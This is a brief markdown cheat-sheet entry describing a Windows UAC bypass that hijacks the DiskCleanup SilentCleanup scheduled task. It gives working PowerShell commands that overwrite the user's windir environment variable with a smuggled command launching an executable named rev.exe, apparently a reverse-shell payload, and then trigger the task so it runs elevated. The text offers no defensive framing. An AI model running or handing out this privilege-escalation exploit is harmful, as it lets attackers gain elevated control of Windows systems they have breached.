---
title: "UAC Bypass"
---

# UAC Bypass

UAC bypass via DiskCleanup scheduled task hijack. The `SilentCleanup` task runs as SYSTEM without a UAC prompt and expands the `windir` environment variable from the user's context, allowing injection of an arbitrary command.

```powershell
# Set windir to execute the payload
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Users\raquel\rev.exe & REM " -Force

# Trigger the scheduled task
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
```
